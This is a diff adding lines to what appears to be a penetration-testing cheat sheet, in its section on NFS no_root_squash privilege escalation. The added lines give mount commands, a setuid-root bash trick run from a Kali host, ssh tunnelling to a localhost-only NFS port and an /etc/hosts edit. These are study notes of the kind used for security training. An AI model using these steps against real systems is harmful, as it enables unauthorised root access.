@@ -4230,6 +4230,22 @@ Path traversal:
 **Root Squashing**
 - Root Squashing is how NFS prevents an obvious privilege escalation
 - `no_root_squash` turns root squashing off
+- example: `/srv/share  localhost(rw,sync,no_root_squash)`
+  ```
+  showmount -e 192.168.182.216
+  sudo mount -t nfs 192.168.182.216:/share /tmp/mount
+  sudo mount -t nfs 192.168.182.216:/srv/share /tmp/mount -o nolock
+  mount -o rw,vers=2 192.168.182.216:/srv/share /tmp/mount
+  ```
+  1. VICTIM: `cp /bin/bash .`
+  2. KALI: `sudo chown root:root bash; sudo chmod +xs bash`
+  3. VICTIM: `./bash -p`
+- if you can't mount because restricted to localhost only and you have access to the victim's machine, try ssh tunneling:
+  ```
+  ssh -N -L localhost:2049:localhost:2049 kali@192.168.45.195
+  ssh -N -L 127.0.0.1:8443:127.0.0.1:8443 kali@192.168.45.245
+  ```
+  - modify `/etc/hosts` with `echo "192.168.45.195 localhost" >> /etc/hosts`
 - Check: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
 
 #### <ins>Kernel Exploits</ins>
